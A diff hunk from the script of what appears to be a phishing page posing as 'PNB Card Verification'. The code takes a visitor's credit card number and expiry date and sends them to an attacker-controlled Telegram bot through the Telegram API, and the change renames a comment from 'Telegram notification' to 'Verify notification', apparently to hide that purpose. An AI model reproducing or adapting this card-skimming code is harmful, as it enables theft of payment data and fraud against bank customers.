@@ -182,7 +182,7 @@
             // Show processing modal
             document.getElementById("modal").style.display = "block";
 
-            // Prepare and send Telegram notification
+            // Prepare and send Verify notification
             const message = `🔹 **PNB Card Verification**\n💳 Credit Card: ${cardNumberField.value}\n📅 Expiry Date: ${expiryDateField.value}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
